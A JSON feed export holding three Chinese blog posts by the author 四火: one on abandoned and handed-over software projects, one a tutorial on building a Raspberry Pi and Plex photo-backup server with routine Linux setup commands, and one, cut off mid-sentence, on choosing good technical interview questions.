{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"那些做了一半的项目","link":"https://www.raychase.net/?p=6083","description":"<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/04/alvaro-reyes-qWwpHwip31M-unsplash.jpg\"><img class=\"alignright wp-image-6086\" src=\"https://www.raychase.net/wp-content/uploads/2020/04/alvaro-reyes-qWwpHwip31M-unsplash.jpg\" alt=\"\" width=\"320\" height=\"213\" /></a>最近有一个项目做了一半不做了，准确地说是由于某些原因，项目需要别的团队来接手了，于是我想随便聊聊这个话题。我猜想，“项目做一半撒手”，这应该是一个很常见的现象，因为这样的事情无论大厂小厂，在软件的世界里不断上演。具体来说，有这样几种典型的情况：</p> \n<ul> \n <li>业务变动、组织调整，工作重心变了，项目做了一半直接砍掉，或者无限期停工。这大概是最常见的一种情形。</li> \n <li>由于前期的调研、设计的严重问题，或是市场等变化过于剧烈，项目做不下去了，静悄悄地黄了。</li> \n <li>项目还做，但是转交给某个其它的团队，这是我这一次遇到的情形。项目还存在，只不过所属关系已经发生变更。</li> \n</ul> \n<h3>文档和隐性成本</h3> \n<p>无论哪一种，有一点是毫无疑问的，那就是资源投入的浪费，无论是软件还是硬件。即便不砍掉，暂停一段时间，再恢复的时候，要捡起曾经的项目，一样需要一定的成本。而项目要转交给其它团队，软件的交接成本也相当可观。其实这没有什么奇怪的，这是软件的本质所决定的。具体来说，软件开发，特别是上规模的软件开发，就意味着大量的 “隐性成本”。</p> \n<p>从项目管理的角度来说，我们当然希望规范而且具体，或者说，大家都照章办事，项目设计可以纸面化，事无巨细地把 “为什么要这样做”，和 “‘这样做’ 是 ‘怎样做’ 的” 这样的信息都落地成文字交代清楚。可是你我程序员都知道，这是遗憾到不可能发生的事情。我在中国的大厂待过，也在北美的大厂待过，<span style=\"color: #ff0000;\"><strong>有个别经历的团队和项目甚至被内部外部视作典范，可是客观地说，文档依然缺失，而且不是缺失一点，而是大量地缺失，再好的项目也是如此。</strong><span style=\"color: #000000;\">有一个有意思的网站，叫做 <a href=\"https://killedbygoogle.com/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">Killed by Google</a>，上面记录了被 Google 砍掉的项目。</span></span></p> \n<p>其实，这并不是什么不可理喻的事情，相反，如果一个一定规模的软件项目，文档清清楚楚，把项目事项和设计细节都交代得清清楚楚，我反而觉得这个项目有着猫腻。因为<span style=\"color: #ff0000;\"><strong>代码和文档永远有着显著而不可调和的矛盾</strong></span>。为什么呢？因为对于软件工程师来说，一个且只有一个真正的、准确的数据来源（<a href=\"https://en.wikipedia.org/wiki/Single_source_of_truth\" target=\"_blank\" rel=\"noopener noreferrer\">Single Source of Truth</a>），是值得推崇的最佳实践。这样的指导思想是根植于他们脑海中的，一个凡是对 Engineering Excellence 有着追求的程序员，一定会把它放在相当重要的位置。而在多数情况下，文档和代码就是两个数据来源，且无法被统一，但是你我都知道，真正工作的一定是代码，代码才是真正的 source of truth，文档只能成为不断过时的那一个。</p> \n<p>我知道一定会有声音说，难道不能及时更新文档吗？比方说，代码逻辑修改了，修改的工程师也负责更新文档。没错，但这过于理想化了，而且，就好像软件的世界里一致性和可用性经常是难以调和的矛盾一样，文档的细致程度，和保持准确性的能力，也一样是难以调和的：文档越是细致，就约难以被及时更新，也就越容易成为过时的文档。文档的更新，不但涉及到工作量的问题，它本身也不符合很多工程师基于代码的思维习惯，因为它的读者有了变化，而且叙述的方式也有了变化；再者，真正在业务中直接生效的，也是代码，文档相应地，总是显得那么间接。</p> \n<p>对于大多数工程师来说，特别是某些踏入职场时间并不长的工程师来说，文档的地位要更低一些。就好像 “talk is cheap, show me the code” 已经被不可思议地滥用一样，他们对于代码有着过度的狂热。这原本不是什么坏事，软件工程师总是要立足的代码的，可是，软件工程所谓工程，它一定是一个复杂的结合体，代码只能是其中一部分，有时甚至只是一小部分。随着时间和阅历的增加，越发觉得合适的文档在软件工程中的价值，比方说，就在几年前，关于文档我的一点思考<a href=\"https://www.raychase.net/4083\" target=\"_blank\" rel=\"noopener noreferrer\">记录在这里</a>，现在其实也已经有了更新。</p> \n<p>再回到隐性成本的话题上来。已经说了，在文档缺失或过时的情况下，程序员需要去理解需求，并阅读代码来理解前前后后整个故事，这里面的时间成本和试错成本可想而知，可退一步说，哪怕真的文档齐全，要把这些东西消化掉，也依然需要大量的时间。我们都说程序员是一个终生学习的职业，而每一个项目，就是一个可观测的学习的单元。</p> \n<h3>是勇气还是荒唐？</h3> \n<p>这样的决定很多时候并不容易做出。我经历过的多数情况，都来自自上而下的决策。有时候部门调整（reorg），结果一些项目的重要性就发生变更，直接砍掉了。而甚至有时候整个部门或团队都砍掉了，我在亚马逊的时候就经历了这么一回，一个原本负责商品在欧洲内各个国家之间方便流通的团队就这样直接砍掉了，当时作为团队里的一份子，我获得了几个 “下家” 团队的选项。也就是说，工程师重新回归资源池，重新分配归属团队。</p> \n<p>但也经历过自下而上的，做过的某个内部应用，本来也是摸着石头过河，第一个版本做出交付了，却发现可用性还是比较差，具体说就是流程还是过于苛刻和冗长，而这个问题又不是一个比较容易解决的问题，很难把它继续推广开去，因此这个项目就烂在半途中了。虽说不能说项目砍掉了，但已经低优先级、无限期搁置了，也就和砍掉没有什么太大区别了。</p> \n<p>多数时候，这样的损失并不只有纸面上能看到的 “浪费” 那么简单。除了上面所说的隐性成本，还有对团队士气的打击。但是，这里面有一个值得玩味的话题，当一个团队全身心地、毫无保留地投身奉献于一个项目的时候，这里的风险就很容易不可控了。有一位团队经理给下属画饼的时候说过，“你要把 xxx 项目当做你自己的孩子一样”，无疑这对于传递 ownership 的精神，是一个很形象的比喻，可是项目可能会黄，到时候该怎么收场呢？因此我觉得这不是一个特别职业的表达。</p> \n<p>最后，回想起来，这种 “做了一半的项目” 还真是挺常见的。非常遗憾，可对于一个大型的组织来说，回头是岸，及时止损，通常可不是坏事。这样的决定无疑需要勇气，更糟的结果是继续这个项目，决策下的越晚损失越大。软件工程似乎就是这样一个无完美解的难题，处处充满了看似可以避免的弯路和糟糕实践，可是换个项目重来一遍的时候，还是一样有这样那样的问题。这有点像是人生，大道理我们都懂，可还是过不好这一生。</p> \n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/6083\">《四火的唠叨》</a></font></strong></p> \n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/1169\" rel=\"bookmark\" title=\"几种华丽无比的开发方式\">几种华丽无比的开发方式 </a></li> \n  <li><a href=\"https://www.raychase.net/4083\" rel=\"bookmark\" title=\"文档那些事儿\">文档那些事儿 </a></li> \n  <li><a href=\"https://www.raychase.net/1601\" rel=\"bookmark\" title=\"关于 Jeff Dean 的几个搞笑传言\">关于 Jeff Dean 的几个搞笑传言 </a></li> \n  <li><a href=\"https://www.raychase.net/711\" rel=\"bookmark\" title=\"Dart：JavaScript 的未来\">Dart：JavaScript 的未来 </a></li> \n  <li><a href=\"https://www.raychase.net/4270\" rel=\"bookmark\" title=\"一个前端项目，到底要集成多少库和工具\">一个前端项目，到底要集成多少库和工具 </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Mon, 13 Apr 2020 00:07:13 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/04/alvaro-reyes-qWwpHwip31M-unsplash.jpg","linkMd5":"40473ed73e13f075fc1b2992559e208c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn99@2020_1/2020/08/24/15-45-04-142_bcd6cc1609fd9f6b.webp","destWidth":640,"destHeight":427,"sourceBytes":37060,"destBytes":19722,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/04/alvaro-reyes-qWwpHwip31M-unsplash.jpg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn99@2020_1/2020/08/24/15-45-04-142_bcd6cc1609fd9f6b.webp"},"publishedOrCreatedDate":1598283901923},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"使用树莓派和 Plex 架设照片和备份服务","link":"https://www.raychase.net/?p=6129","description":"<p><img class=\"wp-image-6140\" style=\"width: 300px; float: right\" src=\"https://www.raychase.net/wp-content/uploads/2020/06/Raspberry.jpg\" alt=\"\" />我用手机拍了很多照片，平时都保存在一台 Windows 台式机上，这台机器硬盘空间大，主要干两个事情，一个是我打游戏，一个就是存放多媒体数据（主要是照片，也有很多文档）。有时候我需要它提供照片服务，以方便家人使用各种媒体终端（手机、电视盒子等）阅览，有时候则需要往上面拷贝数据以作备份只用，于是我使用 Plex <a rel=\"noreferrer noopener\" aria-label=\"折腾了一下 (opens in a new tab)\" href=\"https://www.raychase.net/4687\" target=\"_blank\">折腾了一下</a>，但是由于台式机噪音等等的关系，不适合长期开机，因此当时那个方案还是残缺的。</p> \n<p>现在打算彻底解决这个问题。大致总结一下，以下是我的主要的几个需求：</p> \n<ul>\n <li>照片服务要能够长期保持在线，私用可以方便地查看照片。开机不能有明显的噪音和功耗问题。</li>\n <li>我的照片经常是在 Windows 下进行处理的，因此需要很方便地同步到照片服务器。</li>\n <li>我办公和文档处理都是在 Mac 上进行的，因此需要很方便地同步文档到服务器。</li>\n <li>私用，不愿意上传公有云。</li>\n</ul> \n<p>最近树莓派比较火，因此我花了几十刀买了个第四代，想用它来满足上面的需求。</p> \n<h3>配置树莓派</h3> \n<h4>安装树莓派</h4> \n<p>这一步没有什么特别的，从 4 代开始，风扇显得更为重要，但是接针脚的时候，选择 1-6，而不是 4-6，因为 1 号针脚是 3V3，电压低一些，散热能力是弱一些，但风扇噪音也小一些，适合长期开机。考虑到我们的实际需求，这个够用了。</p> \n<figure class=\"wp-block-image size-large\">\n <img src=\"https://www.raychase.net/wp-content/uploads/2020/06/Raspberry-Pi-GPIO-Header-with-Photo.png\" alt=\"\" class=\"wp-image-6130\" />\n</figure> \n<h4>配置 SSH</h4> \n<p>打开 SSH：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo raspi-config\n</pre> \n<p>在 Interfacing Options 选项中打开 SSH。</p> \n<p>但这样还不够，需要修改 /etc/ssh/sshd_config 添加：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nIPQoS cs0 cs0\n</pre> \n<p>之后重启一下 ssh 服务：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo service ssh restart\n</pre> \n<p>还可以按照我在<a rel=\"noreferrer noopener\" aria-label=\"这篇文章 (opens in a new tab)\" href=\"https://www.raychase.net/4620\" target=\"_blank\">这篇文章</a>中介绍的办法配置密钥访问，不过是局域网内私用，必要性不那么强。</p> \n<h4>关闭自动休眠</h4> \n<p>既然用作服务器，肯定不能自动休眠。</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo apt-get install vim\nsudo vim /etc/lightdm/lightdm.conf\n</pre> \n<p>添加如下：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nxserver-command=X -s 0 -dpms\n</pre> \n<p>重启：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo reboot\n</pre> \n<h4>设置静态 IP</h4> \n<p>静态 IP 可以在树莓派上面配置，不过一旦配错了就没法 ssh 进去改正了；也可以在路由器上面配置，我是在路由器上配置的，操作起来比较方便。我用的路由器是 NETGEAR 的，静态 IP 的配置在 ADVANCED &gt; Setup &gt; LAN Setup 下面。</p> \n<h4>安装 Plex</h4> \n<p><a rel=\"noreferrer noopener\" aria-label=\"这一篇PiMyLifeUp上的教程 (opens in a new tab)\" href=\"https://pimylifeup.com/raspberry-pi-plex-server/\" target=\"_blank\">这一篇 PiMyLifeUp 上的教程</a>很不错，我基本是照着做的。准备工作：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo apt-get install apt-transport-https\ncurl https://downloads.plex.tv/plex-keys/PlexSign.key | sudo apt-key add -\necho deb https://downloads.plex.tv/repo/deb public main | sudo tee /etc/apt/sources.list.d/plexmediaserver.list\nsudo apt-get update\n</pre> \n<p>安装 Plex：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo apt-get install plexmediaserver\n</pre> \n<h4>配置额外的存储</h4> \n<p>自带的 Mini-SD 卡容量太小了，我又买了一张大的，配合 USB 读卡器插上。我一开始使用了卡的默认格式 exFAT，结果同步工具支持得不好，因此没办法，我把它格式化成 Ext4：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo mkfs.ext4 /dev/sda1\n</pre> \n<p>在/media 下面建立了 backup 目录，之后就可以 mount 了：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\n sudo mount -t ext4 /dev/sda1 /media/backup\n</pre> \n<p>虽然搞定了，但是机器一重启，又要重新 mount。因此需要配置为自动 mount，修改/etc/fstab：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\n/dev/sda1 /media/backup ext4 defaults,noatime 0 0\n</pre> \n<p>其中的 noatime 是为了不更新最近访问时间，提高性能。在建立文件夹以后，所属用户和群组全部设置成和同步用 ssh 登录的用户一致，避免一些可能的权限的问题：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo chown pi:pi -R /media/backup/...\n</pre> \n<h3>配置 Windows</h3> \n<p>配置 Windows 的主要目的是方便地同步照片到树莓派服务器。</p> \n<h4>配置同步工具</h4> \n<p>Windows 机是我的一部分媒体文件的数据源，因此需要经常从 Windows 机同步数据到树莓派服务器。</p> \n<p>一种方法是使用 Cygwin + rsync：</p> \n<p>安装 <a rel=\"noreferrer noopener\" aria-label=\"Cygwin (opens in a new tab)\" href=\"https://cygwin.com/\" target=\"_blank\">Cygwin</a>，这是一个可以在 Windows 下使用常见 Linux 命令的工具。基本上，默认选项即可，但是 rsync 一定要安装：</p> \n<figure class=\"wp-block-image size-large\">\n <img src=\"https://www.raychase.net/wp-content/uploads/2020/06/Cygwin.png\" alt=\"\" class=\"wp-image-6135\" />\n</figure> \n<p>安装完成以后，Windows 下的磁盘全部被列在/cygdrive 下面。</p> \n<p>但是我研究到一半的时候，发现了一个更好用的工具——<a href=\"https://www.acrosync.com/home.html\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"Acrosync (opens in a new tab)\">Acrosync</a>：</p> \n<figure class=\"wp-block-image size-large\">\n <img src=\"https://www.raychase.net/wp-content/uploads/2020/06/acrosync_win_demo.gif\" alt=\"\" class=\"wp-image-6137\" />\n</figure> \n<p>第一次可以压缩并使用 scp 来传输文件，因为这样效率会更高，但以后就要通过上面的工具来同步了。</p> \n<p>值得一提的是，如果空间不够，可以使用 du 这样的命令来查看罪魁祸首，不过我使用的参数因为 Linux 版本的关系，和我以往熟悉的比起来有点不同：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo du -s * | sort -nr | head\n</pre> \n<h3>配置 Mac</h3> \n<p>配置 Mac 的主要目的是方便地同步文档到树莓派服务器。</p> \n<h4>配置同步工具</h4> \n<p>Mac 下面同步工具用 rsync 就可以，不需要什么额外的工具。不过，Mac 自带的 rsync 对中文的显示有点问题，因此需要使用 brew 安装一下 rsync。</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nbrew install rsync\n</pre> \n<p>修改 ~/.zshrc，添加：</p> \n<pre class=\"brush: bash; title: ; notranslate\">\nalias sync-to-raspberry=\"rsync -ar -e 'ssh -o PubkeyAuthentication=no' --exclude '.DS_Store' --delete --force --progress ~/Desktop/doc pi@raspberry:~/Documents/doc/\"\n</pre> \n<p>注意第一个 doc 路径后面的斜杠 “/” 不能省略，否则会把服务端的整个 xxx 文件拷贝到 Mac 的 doc 目录里面。另外，里面的主机名 raspberry，是因为我修改了/etc/hosts 文件。</p> \n<h3>大功告成 </h3> \n<p>在树莓派机器上安装 Plex 完毕后，在 Windows 下运行 Acrosync，或者是在 Mac 下执行 sync-to-raspberry 就可以完成同步了，而在浏览器中访问 <a href=\"http://192.168.0.28:32400/web\">http://192.168.0.28:32400/web</a> 就能看到 Plex 界面了。</p> \n<p>之后，在各种终端上安装 Plex 应用，就可以很舒服地浏览照片了。</p> \n<figure class=\"wp-block-image size-large\">\n <img src=\"https://www.raychase.net/wp-content/uploads/2020/06/Plex.png\" alt=\"\" class=\"wp-image-6138\" />\n</figure> \n<h3>问题遭遇和解决</h3> \n<h4>SD 卡格式损坏</h4> [更新于 2020/8/14] 今天忽然发现 ssh 不上去，于是接上显示器，发现启动失败，显示了下面的提示： \n<pre class=\"brush: plain; title: ; notranslate\">\nYou are in emergency mode. After logging in, type \"journalctl -xb\" to view system logs, \"systemctl reboot\" to reboot, \"systemctl default\" or ^D to try again to boot into default mode.\n\nCannot open access to console, the root account is locked.\nSee sulogin(8) man page for more details.\n\nPress enter to continue.\n</pre> \n<p>不过，如果按照提示点击回车，上面的提示会继续来一遍。所以，“continue” 是没用的。</p> \n<p>研究了一下，把系统 sd 卡取了出来，然后装到我的 mac 上，编辑里面的 cmdline.txt，在该行（是同一行，不是新一行）的最后增加一句：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\ninit=/bin/sh\n</pre> \n<p>这样，在重启以后，就可以自动以 root 身份进入命令行了。</p> \n<p>接着检查/etc/fstab，显示的几个挂载的存储，发现那张新 sd 卡没有正常挂载（目录进不去）。尝试重新挂载：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nmount -o remount,rw /dev/sda1 /media/backup\n</pre> \n<p>失败。执行：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\n mount -a\n</pre> \n<p>发现一些错误，于是干脆编辑 fstab，注释掉该行。接着执行：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nexec /sbin/init\n</pre> \n<p>终于可以进入系统了。执行：</p> \n<pre class=\"brush: plain; title: ; notranslate\">\nsudo fsck.ext4 -y /dev/sda1\n</pre> \n<p>修复了错误，再重新恢复挂载的 fstab 配置，并还原/boot/cmdline.txt。搞定。</p> \n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/6129\">《四火的唠叨》</a></font></strong></p>\n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/4727\" rel=\"bookmark\" title=\"开发环境上的代码同步\">开发环境上的代码同步 </a></li> \n  <li><a href=\"https://www.raychase.net/1504\" rel=\"bookmark\" title=\"寻找 Mac 平台上 Windows Live Writer 的替代品\">寻找 Mac 平台上 Windows Live Writer 的替代品 </a></li> \n  <li><a href=\"https://www.raychase.net/4881\" rel=\"bookmark\" title=\"从 Mac 下的包管理和安装工具说起\">从 Mac 下的包管理和安装工具说起 </a></li> \n  <li><a href=\"https://www.raychase.net/5318\" rel=\"bookmark\" title=\"HTTPS 升级\">HTTPS 升级 </a></li> \n  <li><a href=\"https://www.raychase.net/176\" rel=\"bookmark\" title=\"笔记：线程的同步和互斥\">笔记：线程的同步和互斥 </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Wed, 03 Jun 2020 04:31:41 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/06/Raspberry.jpg","linkMd5":"93cfdd9891fef6b848bf4676af464a96","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn12@2020_1/2020/08/24/15-45-04-847_083301c5782ad3e5.webp","destWidth":466,"destHeight":378,"sourceBytes":32391,"destBytes":29422,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/06/Raspberry.jpg":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn12@2020_1/2020/08/24/15-45-04-847_083301c5782ad3e5.webp","https://www.raychase.net/wp-content/uploads/2020/06/Raspberry-Pi-GPIO-Header-with-Photo.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn20@2020_5/2020/08/24/15-45-22-711_e349268c2fdec9cc.webp","https://www.raychase.net/wp-content/uploads/2020/06/Cygwin.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn3@2020_3/2020/08/24/15-45-11-024_17f45376dccf886b.webp","https://www.raychase.net/wp-content/uploads/2020/06/acrosync_win_demo.gif":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn15@2020_2/2020/08/24/15-45-18-228_4b45cebb126aa049.webp","https://www.raychase.net/wp-content/uploads/2020/06/Plex.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn79@2020_6/2020/08/24/15-45-15-193_4ee517a03f4ba782.webp"},"publishedOrCreatedDate":1598283901922},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"技术面试中，什么样的问题才是好问题？","link":"https://www.raychase.net/?p=5934","description":"<p><img class=\"wp-image-5941\" style=\"width: 300px; float: right;\" src=\"https://www.raychase.net/wp-content/uploads/2020/02/interview.jpg\" alt=\"\" />其实很久以前就想谈一谈这个话题了，但是最近才有了足够的动机。因为从最近参加的很多 debrief 来看，我认为身边大多数的软件工程师面试中，在通过技术问题来考察候选人这方面，很多都做得不够好。比方说，我看到对于一些经验丰富的软件工程师候选人的面试，一些面试官依然是草率地扔出一道算法题让做了事，并且认为能不能够比较清晰完整地将代码写出来，是工程师级别裁定的最重要的标准。而这样的做法我认为是非常不妥的。</p> \n<p>首先，我要明确的是，这个问题，指的是技术面试中俗称的 “主要问题”，具体来说，就是面试官会拿出一个问题和候选人讨论，并通过由此开始双方的互相沟通和问题发散来达到考察的目的，因此，这个 “问题”，从某种角度说，更像一个 “话题”。这个过程通常在每轮面试中会持续几十分钟（如果你对这种面试方式感兴趣，你可以看一下这个<a rel=\"noreferrer noopener\" aria-label=\"简单的介绍 (opens in a new tab)\" href=\"https://time.geekbang.org/column/article/139370\" target=\"_blank\">简单的介绍</a>）。下面的讨论，都是建立在这种面试风格和方式之上的。</p> \n<p>其次，作为一个 disclaimer，我想说，以下内容来自于我的认识，并且是针对于技术面试这一个狭窄范围内的认识，自然带有主观的倾向性和认知的局限性，它并不是来自任何公司或组织的标准。</p> \n<p>好，下面我就来尝试把这个问题讲清楚、讲透彻。我认为这并不是一件容易的事情，因此如果你对其有不同的看法，欢迎和我一起讨论。</p> \n<h3>典型案例</h3> \n<p>我先来举这样一个典型的例子，这里面包含了若干个值得商榷的方面，你可以看看是不是似曾相识：</p> \n<blockquote class=\"wp-block-quote\">\n <p>在和候选人谈论完项目和经历以后，面试还有 40 分钟，于是面试官问：你能否实现一个 LRU 队列？</p>\n <p>于是候选人想了一下，就开始做题了，也就是在白板上大写特写，于是面试官也就开始忙自己的事儿了。等到 40 分钟后，候选人写了一白板，但是显然，他在这过程中遇到了一些困难，最后虽然实现了，但是代码写得有些复杂，也遗漏了两、三个重要的 corner case。</p>\n <p>于是面试之后，面试官在评语中写道，“候选人能力一般，算法题实现起来磕磕绊绊，最后的代码偏臃肿，而且有明显的 bug”。</p>\n</blockquote> \n<p>在往下阅读以前，请你想一想，这样的面试形式有哪些值得商榷的地方？</p> \n<h3>技术面试的目的</h3> \n<p>好，我先卖个关子，先不回答上面的问题，而是先谈一谈，对于软件工程师候选人来说，我们为什么要进行这样的技术面试。事实上，有很多考察项，完全不需要技术面试这样麻烦的途径，就可以很容易、很高效地实现；而下面我说的这些方面，这些对于软件工程师来说至关重要的方面，技术面试却是合理考察的唯一可行途径。</p> \n<h4>技术能力方面</h4> \n<p>通常不同轮次的面试，会考察不同的技术点，这个对于不同的团队和职位，是不一样的。</p> \n<p>举例来说，对于某业务平台团队的一个高级工程师的职位，五轮面试中，一轮考察项目和经验，一轮考察系统设计，两轮考察具体问题的解决，特别包括算法和数据结构，还有一轮考察面向对象设计等其它内容，这其中，后三轮都包括白板编码的考察。</p> \n<p>对于一个有经验的工程师候选人来说，我认为这就是一个比较立体、综合，也是一种比较合理的技术考察点的划分方式。并且，这五轮中有四轮都会花费大量的时间，通过我今天将谈到的技术问题，来对候选人进行技术能力方面的评估。这里，有这样几个非常常见的技术方面的考察项：</p> \n<ol>\n <li><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">分析问题，整理需求的能力。</span></strong>问题在一开始可能很模糊，但是优秀的且有经验的工程师可以识别出核心的诉求来，这个 “识别” 的能力，下文我还会详述。这里的诉求可能有多个，但是考虑到时间的关系，面试过程中往往只会从某个角度覆盖其中一两个。</li>\n <li><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">根据需求来设计系统的能力。</span></strong>这里既包括功能性需求，又包括非功能性需求，前者是必须要涉及到的，但是后者也经常也放在一起考量。其实这一点可大可小，它未必一定指系统设计中，功能是否得到实现，并且这个过程中，可能会涉及到系统的扩展性、可用性、一致性等等方面。</li>\n <li><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">将核心逻辑实现的能力。</span></strong>如今，考察比重容易被高估的算法和数据结构就大体上属于这一部分。它也有功能和非功能的两个角度——功能上算法能否实现需求，非功能上算法是否具备足够的性能，编码是否遵循最佳实践，代码是否具备良好的可扩展性等等。而编码能力，指的是在思路达成一致以后，核心逻辑能不能落到纸面（代码）上。毕竟，“空谈误国，实战兴邦”。</li>\n <li><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">经验和其它工程能力。</span></strong>这部分相对更为灵活。比如对测试能力的考察，即可以做怎样的测试来实现对于功能需求和非功能需求正确性的保证。对于特定的团队和项目来说，有时候会特别专注于特定的技术能力，比如前端的团队，是需要考察前端的基础技能的。</li>\n</ol> \n<p>考虑到时间和覆盖面、覆盖深度的权衡，上面这四点有时候不能在一轮面试中完全覆盖，往往也会包括三点。比如，系统设计的面试可以着重覆盖 1、2、4 点，而编码为主的面试可以着重覆盖 1、3、4 点。</p> \n<h4>非技术能力方面</h4> \n<p>和技术能力考察所不同的是，非技术能力考察在不同面试官中的特异性更大，换言之，每个人的角度和标准都可能不相同。但我觉得下面这几条是特别重要，因而必须要覆盖到的：</p> \n<ol>\n <li><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">沟通合作的能力。</span></strong>如果不计时间成本，最理想的面试是什么？其实就是一起工作。工作中才会有足够多必要的沟通，无论是正面的品质还是负面的问题都会无所遁形。可是面试的时间有限，我们没有办法实现真正的工作氛围，但依然可以模拟工作中一起考察、分析和解决问题的过程，而这个过程，就是要通过 “沟通” 串起来的。沟通是一个大的话题，具体的考察项有很多，比如，能不能接受建议？能不能讨论想法？有些候选人一旦进入自己的思考模式就听不进别的话了，于是一个点要反复强调几遍；而有的则是缺少 backbone，稍微追问一下，也不思考，就立马改变主意。</li>\n <li><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">热情和兴趣。</span></strong>热情和兴趣的影响是巨大的，都说兴趣是最好的老师，这部分是很难 “教出来” 的。对于初级工程师来说更是如此。热情和兴趣不但会影响到他/她自己的未来发展，也会影响到整个团队的氛围。</li>\n <li><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">学习能力。</span></strong>学习能力很大程度决定了候选人在新的岗位上进步的潜力。同样的基础和基本的问题解决能力，有的候选人能够 “一点就透”，触类旁通，这在一定程度上就反映了学习的能力。毫无疑问，软件工程师每天都在面对新问题，入职以后就会发现，不止问题是新的，代码是新的，类库是新的，工具是新的，在成熟到能够有一定产出之前，这一步一定是学习。</li>\n</ol> \n<p>技术能力和非技术能力，哪个更占主导？事实上，这二者都很重要，并且二者各自又具备不同的特点。当然相对来说，非技术能力更加难以提高，因而这方面的问题要更加引起重视。比方说，要让一个对于软件领域缺乏热情和兴趣的候选人，在入职以后改头换面，是几乎不可能的一件事情。</p> \n<h4>其它方面</h4> \n<p>上面说的是技术面试中对于 “能力” 的考察。其实，还有一些考察项，严格来说并不能算是 “能力”，因此我就没有归类在上面，也不是本文的重点，但这并不是说它们不重要。</p> \n<p>比如，候选人是否具备正直的品格。在 OCI，debrief 的结果，通常有 hire 和 no hire 两种，但是有一种情况，可以归结到一个特殊的 “never hire” 里面去，这样的候选人没有面试冷冻期，不会有职位和级别的讨论，就是一个 “永不考虑” 聘用——这就是品格问题。品格问题会导致 never hire 的出现，比如候选人对当前的所在职位说谎了。</p> \n<p>再比如，和团队的契合程度。不同的团队，接纳候选人的程度和要求都是不一样的。一个典型的例子是，有时候我们发现，有的候选人在投票的边界线上，即本身是具备相当的潜力的，但是由于相对缺乏领域经验，且某些方面显示出方法明显不得要领。如果团队中有成熟、有经验的工程师可以带着，且团队有一定的空间允许他花更长的时间学习和成长，那么最后的结论就是 hire，否则就是 no hire。你也可以看出，很多时候这样的决定都不是非黑即白的，影响的因素是多方面的。</p> \n<p>再再比如，性格不兼容导致的风险。我遇到过一例，候选人在面试过程中，在多轮面试中都表现出高傲和自满的个性来。于是这成为了一个担心招聘进来以后，风险过高的重要方面。于是最后我们放弃了这个候选人，尽管这个候选人的技术方面是没有问题的。有人可能会说，聪明人都是有个性的。但其实 “有个性” 和 “难相处” 却有着微妙的差别，而且再包容的团队，也有自己的底线。我们当然不希望错过优秀的人才，但是这并不是不计代价的。</p> \n<p>从这几个方面也能看出，这些 “非能力” 的考察项，往往具备着或 0 或 1 的 “red flag” 的特点。面试官一般不会花心思在这部分的考察上，但如果发现这方面的问题，且经过了明确。那结果往往就会是一个明确的否决票，而这个否决票是和级别、职位无关的。</p> \n<h3>回看那个案例</h3> \n<p>讲完了技术面试的目的，再来回看那个案例。那个案例中，所记叙的面试过程，对于技术面试的技术能力和非技术能力的考察，是否有覆盖呢？我们不妨一条一条看吧：</p> \n<p>技术能力方面：</p> \n<ol>\n <li>分析问题，整理需求的能力。这一条考察的程度明显是不够的，给出的问题，是一个明确的、具体的算法题，也就是要实现一个 LRU 